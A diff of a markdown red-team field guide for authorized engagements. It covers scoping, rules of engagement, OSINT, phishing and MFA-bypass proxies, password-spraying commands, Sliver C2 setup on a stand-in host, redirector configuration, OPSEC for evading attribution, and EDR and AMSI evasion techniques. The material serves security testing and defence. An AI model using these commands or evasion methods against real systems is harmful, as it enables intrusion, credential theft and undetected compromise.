@@ -1,14 +1,14 @@
-# Red Team Reference — Authorized Operator Field Guide
+# Red Team Reference: Authorized Operator Field Guide
 
-> **Authorization Notice:** This reference is intended exclusively for authorized red team operators working under signed rules of engagement (ROE) and legal authorization documents. All techniques, tools, and methodologies described herein are for use in authorized security assessments only. Unauthorized use against systems you do not have explicit written permission to test is illegal and unethical. This document serves as a methodology and tradecraft reference — not a step-by-step exploitation guide.
+> Authorization Notice: This reference is intended exclusively for authorized red team operators working under signed rules of engagement (ROE) and legal authorization documents. All techniques, tools, and methodologies described herein are for use in authorized security assessments only. Unauthorized use against systems you do not have explicit written permission to test is illegal and unethical. This document serves as a methodology and tradecraft reference — not a step-by-step exploitation guide.
 
-> **In one minute** — This is the methodology reference for running an authorized red team engagement end to end: how to scope and govern it, how adversaries are emulated across the attack lifecycle, and how the results get turned into defensive improvements. It exists so defenders and operators share one vocabulary for what an assessment covers and how findings feed detection and hardening.
+> In one minute — This is the methodology reference for running an authorized red team engagement end to end: how to scope and govern it, how adversaries are emulated across the attack lifecycle, and how the results get turned into defensive improvements. It exists so defenders and operators share one vocabulary for what an assessment covers and how findings feed detection and hardening.
 
 | | |
 |---|---|
-| **Read this when** | you are standing up a red team program or writing rules of engagement, you are planning an authorized engagement and need a lifecycle checklist, or you are on the blue side and want to understand what an assessment will exercise |
-| **Start at** | [Program Design & Rules of Engagement](#_1-red-team-program-design-amp-rules-of-engagement) for governance, [Reporting & Purple Team Integration](#_9-reporting-amp-purple-team-integration) for turning results into defense |
-| **Pairs with** | [PURPLE_TEAM_REFERENCE.md](PURPLE_TEAM_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md), [THREAT_INFORMED_DEFENSE_REFERENCE.md](THREAT_INFORMED_DEFENSE_REFERENCE.md), [ATTACK_MITIGATIONS_REFERENCE.md](ATTACK_MITIGATIONS_REFERENCE.md) |
+| Read this when | you are standing up a red team program or writing rules of engagement, you are planning an authorized engagement and need a lifecycle checklist, or you are on the blue side and want to understand what an assessment will exercise |
+| Start at | [Program Design & Rules of Engagement](#_1-red-team-program-design-amp-rules-of-engagement) for governance, [Reporting & Purple Team Integration](#_9-reporting-amp-purple-team-integration) for turning results into defense |
+| Pairs with | [PURPLE_TEAM_REFERENCE.md](PURPLE_TEAM_REFERENCE.md), [PENETRATION_TESTING_METHODOLOGY.md](PENETRATION_TESTING_METHODOLOGY.md), [THREAT_INFORMED_DEFENSE_REFERENCE.md](THREAT_INFORMED_DEFENSE_REFERENCE.md), [ATTACK_MITIGATIONS_REFERENCE.md](ATTACK_MITIGATIONS_REFERENCE.md) |
 
 ---
 
@@ -33,39 +33,39 @@
 
 Red teaming is a structured, adversarial simulation discipline distinct from penetration testing and purple teaming. Understanding these distinctions is critical for scoping engagements, setting client expectations, and ensuring the activity delivers actionable security intelligence.
 
-**Red Team vs. Penetration Test vs. Purple Team:**
+Red Team vs. Penetration Test vs. Purple Team:
 
 | Dimension | Penetration Test | Red Team Engagement | Purple Team Exercise |
 |---|---|---|---|
-| **Objective** | Find and validate vulnerabilities | Simulate adversary achieving an objective | Jointly improve detection and response |
-| **Scope** | Broad, enumerate everything | Narrow objective (reach domain admin, exfiltrate data) | Specific TTP subset |
-| **Stealth** | Not typically required | Core requirement — avoid detection | Transparent, collaborative |
-| **Duration** | 1-3 weeks typical | 4-12+ weeks | 1-5 days per sprint |
-| **Blue Team Awareness** | Typically informed | Blind (no-notice) or deconflicted only | Fully collaborative |
-| **Deliverable** | Vulnerability report | Attack narrative + detection gap analysis | Detection improvement report |
-| **Engagement Driver** | Compliance, audit | Threat-informed resilience | SIEM/EDR tuning, blue team maturity |
+| Objective | Find and validate vulnerabilities | Simulate adversary achieving an objective | Jointly improve detection and response |
+| Scope | Broad, enumerate everything | Narrow objective (reach domain admin, exfiltrate data) | Specific TTP subset |
+| Stealth | Not typically required | Core requirement: avoid detection | Transparent, collaborative |
+| Duration | 1-3 weeks typical | 4-12+ weeks | 1-5 days per sprint |
+| Blue Team Awareness | Typically informed | Blind (no-notice) or deconflicted only | Fully collaborative |
+| Deliverable | Vulnerability report | Attack narrative + detection gap analysis | Detection improvement report |
+| Engagement Driver | Compliance, audit | Threat-informed resilience | SIEM/EDR tuning, blue team maturity |
 
 A red team engagement is not a compliance exercise. It is an adversarial simulation designed to answer the question: "Could a real-world threat actor with defined capabilities achieve a specific objective against our organization, and would we detect them?"
 
 ### 1.2 Engagement Types
 
-**Full Adversary Simulation:** Operator teams simulate a specific threat actor (APT group, cybercriminal syndicate) using TTPs sourced from threat intelligence. Often runs 8-16 weeks. Objectives may include data exfiltration, financial system access, OT/ICS network access, or supply chain compromise simulation.
+Full Adversary Simulation: Operator teams simulate a specific threat actor (APT group, cybercriminal syndicate) using TTPs sourced from threat intelligence. Often runs 8-16 weeks. Objectives may include data exfiltration, financial system access, OT/ICS network access, or supply chain compromise simulation.
 
-**Assumed Breach:** The red team begins with a foothold already established (pre-positioned implant, valid credentials, domain-joined laptop). Tests internal detection, lateral movement defenses, and response capability. Useful when initial access has already been validated or when time is limited.
+Assumed Breach: The red team begins with a foothold already established (pre-positioned implant, valid credentials, domain-joined laptop). Tests internal detection, lateral movement defenses, and response capability. Useful when initial access has already been validated or when time is limited.
 
-**Purple Team Exercise:** Structured collaboration where red and blue work together. Red team executes a TTP, blue team attempts detection, both teams immediately discuss gaps and tune detections. VECTR or similar platforms track coverage. More training exercise than true adversarial simulation.
+Purple Team Exercise: Structured collaboration where red and blue work together. Red team executes a TTP, blue team attempts detection, both teams immediately discuss gaps and tune detections. VECTR or similar platforms track coverage. More training exercise than true adversarial simulation.
 
-**Tabletop Exercise:** No active technical execution. Stakeholders (CISO, IR lead, legal, communications) walk through a scenario narrative and evaluate response procedures. Identifies process and communication gaps. Often a precursor to technical exercises.
+Tabletop Exercise: No active technical execution. Stakeholders (CISO, IR lead, legal, communications) walk through a scenario narrative and evaluate response procedures. Identifies process and communication gaps. Often a precursor to technical exercises.
 
-**Physical Red Team:** Operators attempt unauthorized physical access to facilities, data centers, or sensitive areas. Techniques include tailgating, social engineering receptionists, badge cloning, lockpicking, and dumpster diving. Requires extremely specific scope and emergency contacts.
+Physical Red Team: Operators attempt unauthorized physical access to facilities, data centers, or sensitive areas. Techniques include tailgating, social engineering receptionists, badge cloning, lockpicking, and dumpster diving. Requires extremely specific scope and emergency contacts.
 
-**Hybrid / Compound:** Most enterprise engagements combine elements — external initial access attempt, assumed breach if initial access fails, and physical component. Structure depends on maturity and objectives.
+Hybrid / Compound: Most enterprise engagements combine elements — external initial access attempt, assumed breach if initial access fails, and physical component. Structure depends on maturity and objectives.
 
 ### 1.3 Scoping Document Components
 
 The scope document is a legally binding specification of what is and is not permitted. It must be reviewed by legal counsel and signed by an authorized representative of the asset owner before any testing begins.
 
-**In-Scope Definition (be explicit, not implicit):**
+In-Scope Definition (be explicit, not implicit):
 - IP ranges: CIDR notation (10.0.0.0/8, 192.168.1.0/24), with explicit note of any subnets within that range that are excluded
 - Domains and subdomains: *.target.com, specific subdomains (mail.target.com, vpn.target.com)
 - Cloud accounts: AWS account IDs, Azure subscription IDs, GCP project IDs
@@ -73,16 +73,16 @@ The scope document is a legally binding specification of what is and is not perm
 - Physical locations: building addresses, floor numbers, badge access zones
 - Personnel targeting: whether phishing/vishing of employees is authorized, which employee groups
 
-**Out-of-Scope Systems (explicit exclusion list):**
+Out-of-Scope Systems (explicit exclusion list):
 - Production databases containing regulated data (PII, PHI, PCI)
 - Healthcare systems, patient portals, life-safety systems
 - Third-party vendor infrastructure not explicitly included
 - Systems owned by subsidiaries or partners unless separately authorized
 - Cloud-shared infrastructure (hypervisor layer, CSP control planes)
 
-**Prohibited Actions (enumerate clearly):**
+Prohibited Actions (enumerate clearly):
 - Modification or deletion of production data
-- Deployment of actual ransomware (encryptors) — use benign simulators only
+- Deployment of actual ransomware (encryptors): use benign simulators only
 - Denial of service or service disruption actions
 - Exploitation of vulnerabilities in out-of-scope systems even if discovered
 - Social engineering of executive leadership without explicit named authorization
@@ -93,48 +93,48 @@ The scope document is a legally binding specification of what is and is not perm
 
 Every engagement must have a documented emergency stop procedure. Operators must know when and how to halt testing immediately.
 
-**Get-Out-of-Jail (GOOJ) Letter:** Operators carry a physical and digital copy of an authorization letter signed by an authorized representative of the target organization. The letter identifies the operator, engagement dates, authorizing official contact information, and a statement of authorization. If operators are detained by law enforcement or physical security, they present this letter and request contact be made with the named authorizing official.
+Get-Out-of-Jail (GOOJ) Letter: Operators carry a physical and digital copy of an authorization letter signed by an authorized representative of the target organization. The letter identifies the operator, engagement dates, authorizing official contact information, and a statement of authorization. If operators are detained by law enforcement or physical security, they present this letter and request contact be made with the named authorizing official.
 
-**Emergency Stop Triggers:**
+Emergency Stop Triggers:
 - Discovery that an actual threat actor is present on the network (indicators of real compromise)
 - Accidental access to out-of-scope systems containing sensitive regulated data
 - Physical safety concern involving personnel
 - Significant unintended service disruption
 - Legal notice or law enforcement contact
 
-**Deconfliction Channel:** Establish a dedicated secure communication channel (Signal group, encrypted email alias) with a designated client-side security contact who is aware of the engagement. This contact should be available 24/7 during active testing phases and has authority to immediately halt the engagement.
+Deconfliction Channel: Establish a dedicated secure communication channel (Signal group, encrypted email alias) with a designated client-side security contact who is aware of the engagement. This contact should be available 24/7 during active testing phases and has authority to immediately halt the engagement.
 
-**SOC Deconfliction:** Decide whether the SOC is informed of the engagement (semi-transparent) or blind (full opacity). Document which specific SOC personnel are "read in" (typically the CISO and SOC lead). Establish an out-of-band confirmation code that operators can use if contacted by a SOC analyst during testing.
+SOC Deconfliction: Decide whether the SOC is informed of the engagement (semi-transparent) or blind (full opacity). Document which specific SOC personnel are "read in" (typically the CISO and SOC lead). Establish an out-of-band confirmation code that operators can use if contacted by a SOC analyst during testing.
 
 ### 1.5 ROE Document Structure
 
 A well-structured ROE document typically contains:
 
-1. **Legal Authorization Letter** — signed by asset owner's authorized representative, identifying engagement scope, dates, and operator names/companies
-2. **Scope Definition** — in-scope and out-of-scope assets as described above
-3. **Engagement Objectives** — specific adversary objectives (flags/targets) the red team will attempt to achieve
-4. **Rules of Engagement Matrix** — table of techniques and whether each is authorized
-5. **Communication Plan** — authorized contacts, deconfliction channel details, escalation path (operator to team lead to client POC to CISO)
-6. **Reporting Requirements** — interim reporting cadence, final report format, handling requirements for sensitive findings
-7. **Operator Safety Procedures** — GOOJ letter template, emergency stop protocol, legal counsel contact on retainer
-8. **Data Handling** — how captured credentials, data samples, and evidence are stored, retained, and destroyed post-engagement
+1. Legal Authorization Letter: signed by asset owner's authorized representative, identifying engagement scope, dates, and operator names/companies
+2. Scope Definition: in-scope and out-of-scope assets as described above
+3. Engagement Objectives: specific adversary objectives (flags/targets) the red team will attempt to achieve
+4. Rules of Engagement Matrix: table of techniques and whether each is authorized
+5. Communication Plan: authorized contacts, deconfliction channel details, escalation path (operator to team lead to client POC to CISO)
+6. Reporting Requirements: interim reporting cadence, final report format, handling requirements for sensitive findings
+7. Operator Safety Procedures: GOOJ letter template, emergency stop protocol, legal counsel contact on retainer
+8. Data Handling: how captured credentials, data samples, and evidence are stored, retained, and destroyed post-engagement
 
 ### 1.6 Regulatory Frameworks for Red Teaming
 
-**TIBER-EU (Threat Intelligence-Based Ethical Red Teaming):** Developed by the European Central Bank for EU financial sector entities. Three phases: Preparation (scope, engagement rules), Threat Intelligence (targeted intelligence report on likely TTPs against that entity), Red Team Test (adversary simulation guided by TI report). Requires an accredited threat intelligence provider and red team provider. Results shared with national competent authorities. Mutual recognition agreements allow results to be accepted across jurisdictions.
+TIBER-EU (Threat Intelligence-Based Ethical Red Teaming): Developed by the European Central Bank for EU financial sector entities. Three phases: Preparation (scope, engagement rules), Threat Intelligence (targeted intelligence report on likely TTPs against that entity), Red Team Test (adversary simulation guided by TI report). Requires an accredited threat intelligence provider and red team provider. Results shared with national competent authorities. Mutual recognition agreements allow results to be accepted across jurisdictions.
 
-**CBEST (UK):** Framework developed by the UK Financial Conduct Authority (FCA) and Bank of England (BoE) for UK systemically important financial institutions. Similar structure to TIBER-EU — intelligence-led, threat-actor simulation. Requires Council of Registered Ethical Security Testers (CREST) accreditation for providers. Results reported to the PRA/FCA.
+CBEST (UK): Framework developed by the UK Financial Conduct Authority (FCA) and Bank of England (BoE) for UK systemically important financial institutions. Similar structure to TIBER-EU — intelligence-led, threat-actor simulation. Requires Council of Registered Ethical Security Testers (CREST) accreditation for providers. Results reported to the PRA/FCA.
 
-**iCAST (Hong Kong):** Intelligence-led Cyber Attack Simulation Testing framework from the Hong Kong Monetary Authority (HKMA). Applies to authorized institutions in Hong Kong. Follows TI-led red team methodology with HKMA oversight.
+iCAST (Hong Kong): Intelligence-led Cyber Attack Simulation Testing framework from the Hong Kong Monetary Authority (HKMA). Applies to authorized institutions in Hong Kong. Follows TI-led red team methodology with HKMA oversight.
 
-**DORA TLPT (EU Digital Operational Resilience Act):** The Digital Operational Resilience Act requires Threat-Led Penetration Testing (TLPT) for significant financial entities operating in the EU. Builds on TIBER-EU methodology. Entities must conduct TLPT at least every 3 years. Tests must cover live production systems. Results shared with competent authorities.
+DORA TLPT (EU Digital Operational Resilience Act): The Digital Operational Resilience Act requires Threat-Led Penetration Testing (TLPT) for significant financial entities operating in the EU. Builds on TIBER-EU methodology. Entities must conduct TLPT at least every 3 years. Tests must cover live production systems. Results shared with competent authorities.
 
-**Red Team Maturity Model (informal):**
-- **Level 1 — Ad Hoc:** Occasional penetration tests, no structured red team function
-- **Level 2 — Developing:** Defined red team program, basic ROE, annual assessments
-- **Level 3 — Defined:** Threat-informed assessments, MITRE ATT&CK mapped, purple team integration beginning
-- **Level 4 — Managed:** Continuous red team activity, BAS tools supplement manual testing, VECTR tracking, metrics-driven
-- **Level 5 — Optimized:** Intelligence-led adversary simulation, TIBER/CBEST-style engagements, automated detection validation, continuous improvement loop
+Red Team Maturity Model (informal):
+- Level 1: Ad Hoc: Occasional penetration tests, no structured red team function
+- Level 2: Developing: Defined red team program, basic ROE, annual assessments
+- Level 3: Defined: Threat-informed assessments, MITRE ATT&CK mapped, purple team integration beginning
+- Level 4: Managed: Continuous red team activity, BAS tools supplement manual testing, VECTR tracking, metrics-driven
+- Level 5: Optimized: Intelligence-led adversary simulation, TIBER/CBEST-style engagements, automated detection validation, continuous improvement loop
 
 ---
 
@@ -144,7 +144,7 @@ A well-structured ROE document typically contains:
 
 Passive reconnaissance involves gathering intelligence about a target using only publicly available sources, without sending any packets to the target's infrastructure. The goal is to build a comprehensive picture of the attack surface before conducting any active testing that could be logged by the target.
 
-**Intelligence Categories to Develop:**
+Intelligence Categories to Develop:
 - External network perimeter (IP ranges, ASNs, exposed services)
 - Domain and subdomain inventory
 - Technology stack (web servers, frameworks, cloud providers, security products)
@@ -154,7 +154,7 @@ Passive reconnaissance involves gathering intelligence about a target using only
 
 ### 2.2 Network & Infrastructure Intelligence
 
-**Shodan:** The primary search engine for internet-connected devices. Key query syntax:
+Shodan: The primary search engine for internet-connected devices. Key query syntax:
 
 ```
 ssl.cert.subject.CN:"target.com"        # Find all certs issued to target domain
@@ -165,7 +165,7 @@ vuln:CVE-2021-44228                     # Log4Shell vulnerable hosts
 product:"Pulse Secure"                  # Specific product/VPN type
 ```
 
-**Censys:** Certificate-centric internet scanning platform:
+Censys: Certificate-centric internet scanning platform:
 
 ```
 certificates.parsed.names: target.com
@@ -174,9 +174,9 @@ services.tls.certificate.parsed.subject_dn: "O=Target Corporation"
 autonomous_system.organization: "Target Corporation"
 ```
 
-**FOFA (China-based alternative):** `domain="target.com"` and `cert="target.com"` queries. Particularly useful for assets in APAC regions that Shodan/Censys may index less comprehensively.
+FOFA (China-based alternative): `domain="target.com"` and `cert="target.com"` queries. Particularly useful for assets in APAC regions that Shodan/Censys may index less comprehensively.
 
-**ASN Enumeration:** Find all IP ranges owned by a target organization.
+ASN Enumeration: Find all IP ranges owned by a target organization.
 - bgp.he.net: Search by organization name to find ASN numbers
 - Robtex: Reverse lookup of IP ownership and ASN
 - `whois -h whois.radb.net -- '-i origin AS12345'` finds all prefixes originated by an ASN
@@ -184,14 +184,14 @@ autonomous_system.organization: "Target Corporation"
 
 ### 2.3 DNS & Subdomain Enumeration
 
-**Certificate Transparency Logs:** All publicly trusted TLS certificates are logged to CT logs, creating a searchable history of subdomains.
+Certificate Transparency Logs: All publicly trusted TLS certificates are logged to CT logs, creating a searchable history of subdomains.
 
 ```bash
 # crt.sh command-line with jq parsing
 curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
 ```
 
-**Active DNS Enumeration Tools:**
+Active DNS Enumeration Tools:
 
 ```bash
 # Amass
@@ -212,13 +212,13 @@ massdns -r resolvers.txt -t A -o S subdomains.txt -w results.txt
 gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
-**Subdomain Takeover:** After enumeration, check CNAMEs pointing to unclaimed third-party services (GitHub Pages, Heroku, Fastly, Azure, AWS S3). Tools: subjack, nuclei with takeover templates.
+Subdomain Takeover: After enumeration, check CNAMEs pointing to unclaimed third-party services (GitHub Pages, Heroku, Fastly, Azure, AWS S3). Tools: subjack, nuclei with takeover templates.
 
 ### 2.4 GitHub & Code Repository Intelligence
 
 Exposed secrets in public code repositories represent one of the highest-value passive reconnaissance findings.
 
-**GitHub Dorking Patterns:**
+GitHub Dorking Patterns:
 
 ```
 org:targetorg filename:.env
@@ -232,7 +232,7 @@ org:targetorg filename:credentials.json
 org:targetorg filename:config.yml password
 ```
 
-**Automated Tools:**
+Automated Tools:
 
 ```bash
 trufflehog github --org=targetorg
@@ -241,17 +241,17 @@ gitleaks detect --source=cloned-repo-path
 
 ### 2.5 Email Harvesting & Organizational Intelligence
 
-**Email Format Discovery:**
+Email Format Discovery:
 - theHarvester: `theHarvester -d target.com -b all -l 500`
 - hunter.io (web API): provides email format patterns and validates employee emails
 - LinkedIn: profile names cross-referenced with discovered format
 
-**LinkedIn Organizational Intelligence:**
+LinkedIn Organizational Intelligence:
 - Map org chart by browsing employee profiles and inferring reporting relationships from titles
 - Identify recently departed employees whose credentials may still be valid
 - Job postings reveal technology stack: "Experience with Splunk SIEM" identifies the SIEM platform; "Must know CrowdStrike Falcon" identifies the EDR
 
-**Maltego:** Visual link analysis tool with transforms for passive OSINT correlation. Useful for domain-to-IP-to-ASN-to-organization pivoting and email-to-person-to-LinkedIn correlation.
+Maltego: Visual link analysis tool with transforms for passive OSINT correlation. Useful for domain-to-IP-to-ASN-to-organization pivoting and email-to-person-to-LinkedIn correlation.
 
 ### 2.6 Active Reconnaissance
 
@@ -275,7 +275,7 @@ nuclei -u target.com -t technologies/
 nuclei -u target.com -t cves/ -severity critical,high
 ```
 
-**OSINT Framework Categories (osintframework.com):**
+OSINT Framework Categories (osintframework.com):
 Username, Email, Domain, IP, Networks, Social Networks, Instant Messaging, People Search, Telephone, Business, Social Media, Images/Videos, Documents, Forums, Dark Web, Geolocation, Search Engines, Archives, Metadata, Mobile, Password, Code, Threats
 
 ---
@@ -286,7 +286,7 @@ Username, Email, Domain, IP, Networks, Social Networks, Instant Messaging, Peopl
 
 Email phishing remains the highest-yield initial access vector across most enterprise environments. A professional red team phishing campaign involves careful infrastructure setup, content development, and execution with campaign tracking.
 
-**GoPhish Campaign Setup:**
+GoPhish Campaign Setup:
 
 GoPhish is an open-source phishing framework that manages the full campaign lifecycle.
 
@@ -317,7 +317,7 @@ GoPhish is an open-source phishing framework that manages the full campaign life
    - Monitor dashboard for opens, link clicks, credential submissions
 ```
 
-**Phishing Content OPSEC:**
+Phishing Content OPSEC:
 - Use a domain registered at least 60 days before campaign (older domains have better reputation)
 - Match domain naming convention to target (targetcorp-helpdesk.com, not randomletters.xyz)
 - Never use free email providers (Gmail, Hotmail) as sending domain
@@ -327,7 +327,7 @@ GoPhish is an open-source phishing framework that manages the full campaign life
 
 Modern phishing must account for multi-factor authentication. Several techniques exist to bypass common MFA implementations.
 
-**Adversary-in-the-Middle (AiTM) Proxies:**
+Adversary-in-the-Middle (AiTM) Proxies:
 
 EvilGinx3 operates as a reverse proxy that sits between the victim and the legitimate service, allowing real-time capture of session tokens after MFA completion.
 
@@ -352,43 +352,43 @@ sessions
 
 Modlishka is an alternative AiTM proxy with similar capabilities and a different configuration model.
 
-**MFA Push Fatigue (T1621):**
+MFA Push Fatigue (T1621):
 Send rapid successive MFA push notifications to a victim's authenticator app. Goal is to overwhelm the user into approving one request. Most effective when combined with a vishing call impersonating IT support explaining a system issue.
 
-**Browser-in-the-Browser (BitB):**
+Browser-in-the-Browser (BitB):
 Render a fake browser popup window within a web page that mimics an OAuth consent dialog. The fake window appears to be a legitimate popup from accounts.google.com or login.microsoftonline.com but is entirely rendered within the attacker's page.
 
-**QR Code Phishing (Quishing):**
+QR Code Phishing (Quishing):
 Embed malicious URL in a QR code image rather than a hyperlink. Email URL scanners that rewrite/scan links do not process QR code images. Mobile devices scanning the QR code may have fewer security controls than corporate endpoints.
 
 ### 3.3 Voice Phishing (Vishing)
 
 Vishing is often the fastest path to initial access in organizations with strong email filtering but weaker phone-based verification processes.
 
-**Help Desk Bypass Pretexting:**
+Help Desk Bypass Pretexting:
 Operator calls help desk impersonating an executive or employee. Common approaches:
 - Impersonate an executive's assistant in a time-pressured situation (international travel, board meeting)
 - Impersonate an on-site technician with a badge access issue
 - Impersonate a user who received a security alert about their compromised account
 
-**Identity Verification Bypass:** Most help desks use weak identity verification (employee ID, manager name) — all obtainable via LinkedIn OSINT. Identify verification mechanisms during reconnaissance to adapt the pretext.
+Identity Verification Bypass: Most help desks use weak identity verification (employee ID, manager name) — all obtainable via LinkedIn OSINT. Identify verification mechanisms during reconnaissance to adapt the pretext.
 
 ### 3.4 Physical Access Techniques
 
-**Tailgating/Piggybacking:** Following an authorized person through a badge-controlled door without using a badge. Social engineering variant: carry a large box or appear as a delivery person.
+Tailgating/Piggybacking: Following an authorized person through a badge-controlled door without using a badge. Social engineering variant: carry a large box or appear as a delivery person.
 
-**RFID Badge Cloning:**
+RFID Badge Cloning:
 - Proxmark3: Professional RFID research and cloning tool. Reads HID Prox (125kHz), iClass (13.56MHz), and many other formats.
 - Flipper Zero: Consumer multi-tool supporting 125kHz LF RFID (HID Prox, EM4100), NFC (MIFARE Classic, DESFire). More portable and inconspicuous than Proxmark3.
 - Modern access control systems using encrypted credentials (MIFARE DESFire EV1/EV2, iCLASS SE) cannot be cloned without the encryption keys. Reconnaissance should determine badge technology before committing to cloning attacks.
 
-**USB Drop Payloads:**
+USB Drop Payloads:
 - Hak5 Rubber Ducky: Emulates a USB HID keyboard. Executes pre-programmed DuckyScript sequences at typing speeds that bypass behavioral detection.
 - O.MG Cable: Appears as a legitimate charging or data cable. Contains a hidden Wi-Fi-accessible implant that executes HID attacks on command.
 
 ### 3.5 Technical Initial Access
 
-**Password Spraying with IP Rotation:**
+Password Spraying with IP Rotation:
 
 ```bash
 # Fireprox — creates AWS API Gateway proxy to rotate source IPs
@@ -403,7 +403,7 @@ Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!" \
 kerbrute passwordspray -d corp.local users.txt "Winter2024!" --dc 10.0.0.1
 ```
 
-**Common Password Spray Patterns:**
+Common Password Spray Patterns:
 - Season+Year: Winter2024!, Spring2025
 - Company name variants: Company1, Company123!
 - Welcome variations: Welcome1!, Welcome@123
@@ -417,7 +417,7 @@ kerbrute passwordspray -d corp.local users.txt "Winter2024!" --dc 10.0.0.1
 
 Command and Control (C2) infrastructure is the backbone of a red team engagement, enabling operator control of deployed implants. Framework selection depends on engagement requirements, target environment, and budget.
 
-**Framework Comparison:**
+Framework Comparison:
 
 | Framework | Type | Cost | Key Features | Best For |
 |---|---|---|---|---|
@@ -428,12 +428,12 @@ Command and Control (C2) infrastructure is the backbone of a red team engagement
 | Mythic | Open Source | Free | Agent/C2 profile modularity, web UI, extensive plugin ecosystem | Custom implant development |
 | Metasploit | Open Source | Free (Pro available) | Broad exploit library, meterpreter, well-understood | Initial access, less OPSEC-sensitive phases |
 
-**Cobalt Strike Key Capabilities:**
+Cobalt Strike Key Capabilities:
 - Malleable C2 Profiles: Define how beacon network traffic looks (HTTP headers, URIs, jitter timing) to blend with legitimate application traffic. Custom profiles should be developed for mature engagements.
 - Beacon Object Files (BOFs): Small compiled C programs that execute within the beacon process, avoiding new process creation. Reduces EDR telemetry compared to fork-and-run.
 - Team Server: Multi-operator server where beacons check in and operators share sessions.
 
-**Sliver Implant Generation:**
+Sliver Implant Generation:
 
 ```bash
 # Generate an HTTP implant
@@ -454,14 +454,14 @@ sliver > http --domain c2.example.com --lhost 0.0.0.0 --lport 443
 
 Professional red team infrastructure uses multiple layers to protect the team server from discovery and attribution.
 
-**Three-Tier Architecture:**
+Three-Tier Architecture:
 
 ```
 [Implant on victim] --> [Redirector Tier 1: CDN/Domain Fronting] -->
 [Redirector Tier 2: Apache/Nginx mod_rewrite] --> [Team Server]
 ```
 
-**Apache mod_rewrite Redirector Configuration:**
+Apache mod_rewrite Redirector Configuration:
 
 ```apache
 RewriteEngine On
@@ -478,29 +478,29 @@ RewriteRule .* https://www.google.com/ [L,R=302]
 RewriteRule ^/path/(.*)$ https://TEAM_SERVER_IP:4443/$1 [L,P]
 ```
 
-**Domain Selection Criteria:**
+Domain Selection Criteria:
 - Aged domains (purchased 6+ months prior) with established web reputation categories (news, technology, shopping — avoid "uncategorized")
 - Domains that plausibly relate to legitimate business services
 - Valid TLS certificates from trusted CAs (Let's Encrypt)
 - Configured rDNS records
 - Separate domains per implant type (HTTP beacon vs. DNS C2 vs. HTTPS exfil)
 
-**DNS-Based C2:** For environments with highly restrictive egress filtering (only port 53 allowed outbound), DNS C2 tunnels data through DNS TXT/A/CNAME record queries. Extremely slow but effective when HTTP/HTTPS is blocked. Sliver, Cobalt Strike, and DNScat2 all support DNS C2.
+DNS-Based C2: For environments with highly restrictive egress filtering (only port 53 allowed outbound), DNS C2 tunnels data through DNS TXT/A/CNAME record queries. Extremely slow but effective when HTTP/HTTPS is blocked. Sliver, Cobalt Strike, and DNScat2 all support DNS C2.
 
 ### 4.3 Operational Security (OPSEC) Checklist
 
 OPSEC failures expose the red team's identity, tactics, and infrastructure — potentially alerting the real adversary the exercise is meant to simulate, or causing legal complications.
 
-**Infrastructure OPSEC:**
+Infrastructure OPSEC:
 - [ ] All team server access routes through VPN (Mullvad or similar no-log provider) before connecting to offshore VPS
-- [ ] Team server is not directly exposed — all access through redirector tier
+- [ ] Team server is not directly exposed: all access through redirector tier
 - [ ] Each engagement uses unique, newly provisioned infrastructure (no reuse across clients)
 - [ ] Domain registration uses privacy protection and privacy-preserving payment
-- [ ] TLS certificates from public CA — avoid self-signed on external-facing infrastructure
+- [ ] TLS certificates from public CA: avoid self-signed on external-facing infrastructure
 - [ ] Redirector logs are sanitized or disabled
 - [ ] Team server firewall allows inbound only from redirector IPs
 
-**Implant OPSEC:**
+Implant OPSEC:
 - [ ] Unique implant configuration per operator, per target host (different sleep times, jitter, unique identifiers)
 - [ ] Metadata stripped from all payload files (exiftool -all= payload.exe)
 - [ ] No debugging symbols, PDB paths, or developer usernames in compiled implants
@@ -508,7 +508,7 @@ OPSEC failures expose the red team's identity, tactics, and infrastructure — p
 - [ ] Beacon sleep time set to realistic interval (5-15 minutes typical for long-running campaigns)
 - [ ] C2 traffic profile matches observed legitimate traffic on target network
 
-**Operator OPSEC:**
+Operator OPSEC:
 - [ ] Operator personal devices not used for engagement activities
 - [ ] Personal accounts (email, social) not accessed from engagement VPN/VPS
 - [ ] Signal or encrypted channel used for operator coordination (not SMS or personal Slack)
@@ -534,7 +534,7 @@ Effective payload development requires addressing each of these detection surfac
 
 ### 5.2 Process Injection Techniques
 
-**DLL Sideloading (T1574.002):**
+DLL Sideloading (T1574.002):
 Many legitimate Windows applications attempt to load DLLs from the application directory before the System32 path. If the application directory is writable and a required DLL does not exist there, an attacker can place a malicious DLL.
 
 ```
@@ -543,13 +543,13 @@ Filter: Operation = CreateFile, Path ends with .dll, Result = NAME NOT FOUND
 Look for auto-start applications or scheduled tasks that load DLLs from writable paths
 ```
 
-**Process Hollowing (T1055.012):**
+Process Hollowing (T1055.012):
 Create a legitimate process in suspended state, unmap its memory, write shellcode/PE into the now-empty address space, adjust entry point, resume execution. The process appears legitimate in process listings. EDRs detect via memory scanning — executable regions with no backing file-on-disk are suspicious.
 
-**Reflective DLL Injection (T1055.001):**
+Reflective DLL Injection (T1055.001):
 A DLL that contains its own loader capable of loading itself from memory without requiring the Windows loader. The DLL resolves its own imports and relocates itself. Avoids writing DLL to disk. Implementation: ReflectiveDLLInjection (by Stephen Fewer), or modern variants with additional OPSEC features.
 
-**Shellcode Execution via Callback Functions:**
+Shellcode Execution via Callback Functions:
 Execute shellcode by passing it as a callback to a Windows API function. The operating system invokes the callback, bypassing some hook-based detection that monitors CreateThread directly.
 
 ```c
@@ -559,19 +559,19 @@ Execute shellcode by passing it as a callback to a Windows API function. The ope
 // CreateTimerQueueTimer, SetTimer (WndProc callback), EnumThreadWindows
 ```
 
-**Direct Syscalls (SysWhispers3):**
+Direct Syscalls (SysWhispers3):
 EDR user-mode hooks are placed on ntdll.dll exports (NtOpenProcess, NtAllocateVirtualMemory, etc.). Direct syscalls bypass these hooks by issuing the syscall instruction with the correct syscall number directly, without going through the hooked ntdll function. SysWhispers3 generates assembly stubs that determine the correct syscall number at runtime to handle different Windows versions.
 
 ### 5.3 AMSI Bypass Techniques
 
 The Antimalware Scan Interface (AMSI) intercepts PowerShell, JScript, VBScript, and other script content before execution and passes it to the registered AV provider for scanning.
 
